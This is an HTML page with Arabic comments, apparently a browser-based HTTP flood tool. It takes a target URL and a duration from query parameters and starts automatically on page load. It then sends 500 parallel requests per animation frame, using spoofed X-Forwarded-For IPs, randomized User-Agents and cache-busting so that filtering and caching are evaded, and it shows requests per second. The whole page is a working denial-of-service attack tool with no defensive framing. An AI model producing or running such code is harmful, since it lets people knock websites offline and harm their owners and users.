<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أداة إرسال طلبات</title>
    <script>
        // دالة لتحليل البارامترات من URL
        function getQueryParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                url: params.get('url') || '',
                time: parseInt(params.get('time')) || 10
            };
        }

        // متغيرات التتبع
        let totalRequests = 0;
        let requestsPerSecond = 0;
        let intervalId;
        let isRunning = false;

        // دالة لإنشاء عنوان IP عشوائي
        function getRandomIP() {
            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        }

        // دالة لإرسال طلب سريع
        function sendRequest(targetUrl) {
            if (!isRunning) return;

            const headers = {
                'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 20) + 80}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 200)} Safari/537.36`,
                'X-Forwarded-For': getRandomIP(),
                'Accept': '*/*',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            };

            // إضافة معرف عشوائي لتجنب التخزين المؤقت
            const cacheBustUrl = `${targetUrl}?_=${Math.random().toString(36).slice(2)}`;

            fetch(cacheBustUrl, {
                method: 'GET',
                headers: headers,
                mode: 'no-cors',
                cache: 'no-store',
                referrerPolicy: 'no-referrer'
            })
            .then(() => {
                if (isRunning) {
                    totalRequests++;
                    requestsPerSecond++;
                }
            })
            .catch(() => {
                // تجاهل الأخطاء للحفاظ على السرعة
            });
        }

        // دالة لبدء الإرسال
        function startSending(targetUrl, durationSeconds) {
            if (!targetUrl) {
                document.body.textContent = 'خطأ: يرجى تحديد رابط الهدف عبر بارامتر url';
                return;
            }

            isRunning = true;
            const startTime = Date.now();
            const endTime = startTime + (durationSeconds * 1000);

            // تحديث العداد كل ثانية
            intervalId = setInterval(() => {
                document.body.textContent = `rps ${requestsPerSecond} total ${totalRequests}`;
                requestsPerSecond = 0;
            }, 1000);

            // دالة الإرسال المتواصل
            function sendLoop() {
                if (!isRunning || Date.now() >= endTime) {
                    stopSending();
                    return;
                }

                // زيادة عدد الطلبات المتوازية إلى 50
                const parallelRequests = 500;
                for (let i = 0; i < parallelRequests; i++) {
                    sendRequest(targetUrl);
                }

                // استخدام requestAnimationFrame بدلاً من setTimeout لتحسين الأداء
                requestAnimationFrame(sendLoop);
            }

            sendLoop();

            // إيقاف الإرسال بعد الوقت المحدد
            setTimeout(stopSending, durationSeconds * 1000);
        }

        // دالة لإيقاف الإرسال
        function stopSending() {
            isRunning = false;
            clearInterval(intervalId);
            document.body.textContent = `تم الانتهاء | rps ${requestsPerSecond} total ${totalRequests}`;
        }

        // بدء التنفيذ عند تحميل الصفحة
        window.onload = function() {
            document.body.style.margin = '0';
            document.body.style.padding = '0';
            document.body.style.fontFamily = 'monospace';
            document.body.style.fontSize = '24px';
            document.body.style.textAlign = 'center';
            document.body.style.paddingTop = '50px';
            document.body.style.backgroundColor = 'white';
            document.body.style.color = 'black';

            const params = getQueryParams();
            startSending(params.url, params.time);
        };
    </script>
</head>
<body></body>
</html>
